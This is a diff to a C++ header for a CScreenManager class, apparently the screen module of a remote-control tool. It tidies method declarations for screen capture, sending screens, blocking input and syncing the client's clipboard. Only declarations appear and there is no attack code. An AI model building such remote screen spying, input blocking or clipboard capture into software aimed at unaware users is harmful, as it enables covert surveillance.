@@ -22,18 +22,19 @@ public:
 	HANDLE  m_hWorkThread;
 
 	static DWORD WINAPI WorkThreadProc(LPVOID lParam);
-	VOID CScreenManager::SendBitMapInfor();
-	VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength);
+	VOID SendBitMapInfor();
+	VOID OnReceive(PBYTE szBuffer, ULONG ulLength);
 
 	CScreenSpy* m_ScreenSpyObject;
-	VOID CScreenManager::SendFirstScreen();
-	VOID CScreenManager::SendNextScreen();
+	VOID SendFirstScreen();
+	const char* GetNextScreen(ULONG &ulNextSendLength);
+	VOID SendNextScreen(const char* szBuffer, ULONG ulNextSendLength);
 
-	VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength);
+	VOID ProcessCommand(LPBYTE szBuffer, ULONG ulLength);
 	BOOL  m_bIsWorking;
 	BOOL  m_bIsBlockInput;
-	VOID CScreenManager::SendClientClipboard();
-	VOID CScreenManager::UpdateClientClipboard(char *szBuffer, ULONG ulLength);
+	VOID SendClientClipboard();
+	VOID UpdateClientClipboard(char *szBuffer, ULONG ulLength);	
 };
 
 #endif // !defined(AFX_SCREENMANAGER_H__511DF666_6E18_4408_8BD5_8AB8CD1AEF8F__INCLUDED_)
